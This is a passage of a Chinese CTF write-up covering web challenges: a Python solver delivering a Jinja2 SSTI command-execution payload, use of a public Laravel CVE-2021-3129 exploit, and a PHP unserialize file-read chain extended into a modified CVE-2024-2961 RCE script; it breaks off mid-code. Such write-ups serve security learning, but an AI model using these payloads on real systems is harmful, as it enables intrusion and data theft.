class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;未找到 flag!&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;计算表达式时出错：&quot;</span>, e)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;返回内容不是算术表达式：&quot;</span>, h1_text)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;页面内容未发生变化，h1 内容为：&quot;</span>, h1_text)</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204414282-806340589.png" alt="img"></p><p>得到奖品</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">solved=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">global</span> current_expr</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 前端计算</span></span><br><span class="line">    .....</span><br><span class="line">    .....</span><br><span class="line">    <span class="comment"># 通过计算</span></span><br><span class="line"></span><br><span class="line">    username = <span class="string">&#x27;ctfer!&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        username = request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> whitelist_filter(username,whitelist_patterns):</span><br><span class="line">            <span class="keyword">if</span> blacklist_filter(username):</span><br><span class="line">                <span class="keyword">return</span> render_template_string(<span class="string">&quot;filtered&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;你过关！&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(<span class="string">&quot;filtered&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, username=username, hint=<span class="string">&quot;f4dd790b-bc4e-48de-b717-903d433c597f&quot;</span>)</span><br></pre></td></tr></table></figure><p>发现这有个额外的参数username，就一直试get传参，怎么传都传不上去，多次测试后发现需要用get传data值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造带有计算结果和 username 参数的 URL</span></span><br><span class="line">answer_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?answer=<span class="subst">&#123;result&#125;</span>&amp;Submit=提交&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;&#123;&#123;7*7&#125;&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 提交答案并打印返回内容</span></span><br><span class="line">response = requests.get(answer_url, headers=headers,data=data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;提交答案后的返回内容：&quot;</span>, response.text)</span><br></pre></td></tr></table></figure><p>修改上面这部分代码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204503328-1700217939.png" alt="img"></p><p>成功执行，后面就ssti直接打了，注意在黑名单有个空格过滤，需要绕一下最终payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> fenjing</span><br><span class="line"><span class="comment"># 主页面 URL</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.18.28/&quot;</span></span><br><span class="line">calc_url = url + <span class="string">&quot;calc&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发起第一次请求，获取初始页面内容</span></span><br><span class="line">response = requests.get(url, headers=headers)</span><br><span class="line">soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 h1 标签内容</span></span><br><span class="line">h1_text = soup.find(<span class="string">&#x27;h1&#x27;</span>).get_text().strip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;第一次请求内容:&quot;</span>, h1_text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果 h1 标签内容为 &quot;Are you ready for this?&quot;，等待一秒后检查新的内容</span></span><br><span class="line"><span class="keyword">if</span> h1_text == <span class="string">&quot;Are you ready for this?&quot;</span>:</span><br><span class="line">    time.sleep(<span class="number">1</span>)  <span class="comment"># 等待 1 秒</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第二次请求 /calc，模拟页面定时刷新后的情况</span></span><br><span class="line">    response = requests.get(calc_url, headers=headers)</span><br><span class="line">    h1_text = response.text.strip()  <span class="comment"># 获取返回内容</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查返回内容是否为算术表达式</span></span><br><span class="line">    <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">r&quot;^[\d\+\-\*/\s]+$&quot;</span>, h1_text):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;算术表达式为：&quot;</span>, h1_text)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 使用 eval 计算结果</span></span><br><span class="line">            result = <span class="built_in">eval</span>(h1_text)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;计算结果为：&quot;</span>, result)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 构造带有计算结果和 username 参数的 URL</span></span><br><span class="line">            answer_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?answer=<span class="subst">&#123;result&#125;</span>&amp;Submit=提交&quot;</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;&#x27;&#x27;&#123;&#123;[].__class__.__base__.__subclasses__()[351](&#x27;cat$&#123;IFS&#125;/flag&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># 提交答案并打印返回内容</span></span><br><span class="line">            response = requests.get(answer_url, headers=headers,data=data)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;提交答案后的返回内容：&quot;</span>, response.text)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 提取返回中的 flag&#123;&#125; 内容</span></span><br><span class="line">            <span class="keyword">match</span> = re.search(<span class="string">r&#x27;flag\&#123;.*?\&#125;&#x27;</span>, response.text)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                flag = <span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;获取到的 flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;未找到 flag!&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;计算表达式时出错：&quot;</span>, e)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;返回内容不是算术表达式：&quot;</span>, h1_text)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;页面内容未发生变化，h1 内容为：&quot;</span>, h1_text)</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204533224-871070081.png" alt="img"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204538045-365324802.png" alt="img"></p><h2 id="ezlaravel"><a href="#ezlaravel" class="headerlink" title="ezlaravel"></a>ezlaravel</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204558132-668296899.png" alt="img"></p><p>有版本号，google搜相关exp</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204607120-450017409.png" alt="img"></p><p>通过<a href="https://www.ambionics.io/blog/laravel-debug-rce">https://www.ambionics.io/blog/laravel-debug-rce</a></p><p>验证确定是CVE-2021-3129</p><p>图片上的链接试过出不来，接着找其他这个CVE的exp</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204642089-281007871.png" alt="img"></p><p>最终在github挨个试，找到这个项目<a href="https://github.com/joshuavanderpoll/CVE-2021-3129">https://github.com/joshuavanderpoll/CVE-2021-3129</a></p><p>要把项目中的phpggc-master目录下的文件都复制到与CVE-2021-3129.py同级目录，不然会报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-<span class="number">2021</span>-<span class="number">3129.</span>py --force</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204705557-1565179572.png" alt="img"></p><p><code>laravel/rce12</code>这条链子可以RCE</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204725436-400606183.png" alt="img"></p><p>最后在根目录找到flag.txt</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204740357-677709090.png" alt="img"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204746082-101934285.png" alt="img"></p><h2 id="fileread"><a href="#fileread" class="headerlink" title="fileread"></a>fileread</h2><p>题目给了源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cls1</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cls</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$arr</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;arr <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;cls-&gt;<span class="variable">$v</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cls2</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$filename</span> = <span class="string">&#x27;hello.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$txt</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">           <span class="title function_ invoke__">var_dump</span>(<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="string">&#x27;fileput&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fileput</span>();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&lt;p&gt;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$key</span>).<span class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fileput</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Your file:&#x27;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>))&#123;</span><br><span class="line">    <span class="variable">$cls</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>]);</span><br><span class="line">    <span class="variable">$instance</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$cls</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">cls1</span>();</span><br><span class="line">    <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一个简单的反序列化,这样简单构造就能任意文件读取,但是读flag没有权限,后来看<code>/proc/1/cmdline</code>可以发现有个<code>/tmp/run.sh</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">cls1</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;cls=<span class="keyword">new</span> <span class="title function_ invoke__">cls2</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;arr[]=<span class="string">&quot;fileput&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;cls-&gt;filename=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=/proc/1/cmdline&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204837024-984031556.png" alt="img"></p><p>能够发现有个<code>/readflag</code>，最后肯定是要执行<code>/readflag</code>来获得flag，所以就是要任意文件读取转<code>rce</code>一开始试了<code>filterchain</code>写马,结果没成功,又试了<code>php_filter_oracle</code>攻击也没成功，不过这个可能是我打的有问题，最后尝试<code>CVE-2024-2961</code>，也是文件读取转RCE，但是得改脚本</p><p>之前的比赛也有考这个CVE的题，例如:<a href="[http://fffffilm.top/2024/09/15/BaseCTF-WEB%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#Just-Readme](http://fffffilm.top/2024/09/15/BaseCTF-WEB部分题解/#Just-Readme">BaseCTF的Just Readme</a>)和<a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18296185">春秋杯夏季赛wordpress</a></p><p>主要借鉴了春秋杯夏季赛wordpress最后攻击的点改的脚本.</p><p>最主要是改Remote这个类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Remote</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A helper class to send the payload and download files.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The logic of the exploit is always the same, but the exploit needs to know how to</span></span><br><span class="line"><span class="string">    download files (/proc/self/maps and libc) and how to send the payload.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The code here serves as an example that attacks a page that looks like:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Tweak it to fit your target, and start the exploit.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, url: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.url = url</span><br><span class="line">        self.session = Session()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; Response:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        p = <span class="string">f&quot;php://filter/convert.base64-encode/resource=<span class="subst">&#123;path&#125;</span>&quot;</span></span><br><span class="line">        <span class="comment"># 生成序列化字符串，并计算编码后的路径长度</span></span><br><span class="line">        a = <span class="built_in">len</span>(p)</span><br><span class="line">        serialized_path = <span class="string">f&#x27;O:4:&quot;cls1&quot;:2:&#123;&#123;s:3:&quot;cls&quot;;O:4:&quot;cls2&quot;:2:&#123;&#123;s:8:&quot;filename&quot;;s:<span class="subst">&#123;a&#125;</span>:&quot;<span class="subst">&#123;p&#125;</span>&quot;;s:3:&quot;txt&quot;;s:0:&quot;&quot;;&#125;&#125;s:3:&quot;arr&quot;;a:1:&#123;&#123;i:0;s:7:&quot;fileput&quot;;&#125;&#125;&#125;&#125;;&#x27;</span></span><br><span class="line">        <span class="comment"># 对整个序列化后的字符串进行 base64 编码</span></span><br><span class="line">        encoded_serialized_path = base64.encode(serialized_path.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        url =self.url</span><br><span class="line">        params=&#123;</span><br><span class="line">                <span class="string">&quot;ser&quot;</span>:encoded_serialized_path</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(params)</span><br><span class="line">        response = self.session.get(url, params=params)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"><span class="comment"># 打印实际请求的 UR</span></span><br><span class="line">       <span class="comment"># return self.session.get(url, params=params)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Returns the contents of a remote file.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment">#     p = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;</span></span><br><span class="line">    <span class="comment">#生成序列化字符串，并计算编码后的路径长度</span></span><br><span class="line">    <span class="comment">#     a = len(p)</span></span><br><span class="line">    <span class="comment">#     serialized_path = f&#x27;O:4:&quot;cls1&quot;:2:&#123;&#123;s:3:&quot;cls&quot;;O:4:&quot;cls2&quot;:2:&#123;&#123;s:8:&quot;filename&quot;;s:&#123;a&#125;:&quot;&#123;p&#125;&quot;;s:3:&quot;txt&quot;;s:0:&quot;&quot;;&#125;&#125;s:3:&quot;arr&quot;;a:1:&#123;&#123;i:0;s:7:&quot;fileput&quot;;&#125;&#125;&#125;&#125;;&#x27;</span></span><br><span class="line">    <span class="comment"># 对整个序列化后的字符串进行 base64 编码</span></span><br><span class="line">    <span class="comment">#     encoded_serialized_path = base64.encode(serialized_path.encode(&#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="comment">#     print(encoded_serialized_path)</span></span><br><span class="line">    <span class="comment"># 发送请求，获取响应</span></span><br><span class="line">        response = self.send(path)</span><br><span class="line">        <span class="built_in">print</span>(response)</span><br><span class="line">        <span class="comment">#path = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;</span></span><br><span class="line">        <span class="comment">#response = self.send(path)</span></span><br><span class="line">        data = re.search(<span class="string">r&#x27;Your file:(.*)&#x27;</span>, response.text, flags=re.S).group(<span class="number">1</span>)</span><br><span class="line">        <span class="comment">#data=response.text</span></span><br><span class="line">        <span class="keyword">return</span> base64.decode(data)</span><br></pre></td></tr></table></figure><p>由于我们是要传递<code>http://url?ser=base64</code>加密后的payload，所以要更改原exp的请求部分，原exp是在path那部分传递payload，而我们需要在</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;cls1&quot;</span>:<span class="number">2</span>:&#123;&#123;s:<span class="number">3</span>:<span class="string">&quot;cls&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;cls2&quot;</span>:<span class="number">2</span>:&#123;&#123;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:&#123;a&#125;:<span class="string">&quot;&#123;p&#125;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;txt&quot;</span>;s:<span class="number">0</span>:<span class="string">&quot;&quot;</span>;&#125;&#125;s:<span class="number">3</span>:<span class="string">&quot;arr&quot;</span>;a:<span class="number">1</span>:&#123;&#123;i:<span class="number">0</span>;s:<span class="number">7</span>:<span class="string">&quot;fileput&quot;</span>;&#125;&#125;&#125;&#125;;</span><br></pre></td></tr></table></figure><p>这里传递payload，于是在序列化字符串<code>filename</code>部分改成<code>s:&#123;a&#125;:&quot;&#123;p&#125;&quot;</code>，<code>&#123;a&#125;</code>是payload的长度，<code>&#123;p&#125;</code>是原payload</p><p>之后再用base64加密,并将原来的post传参改成get传参即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = self.session.get(url, params=params)</span><br></pre></td></tr></table></figure><p>然后就是另一个卡我半天的点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data = re.search(<span class="string">r&#x27;Your file:(.*)&#x27;</span>, response.text, flags=re.S).group(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>匹配语句这部分，要匹配的是响应的内容<code>file:</code>之后的部分</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205236168-702125291.png" alt="img"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205241457-510358314.png" alt="img"></p><p>在<code>def download</code>这个函数里写的传payload,最后执行exp的时候<code>send</code>函数里没写报的错,把这个一改就直接打通了</p><p>最终exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span 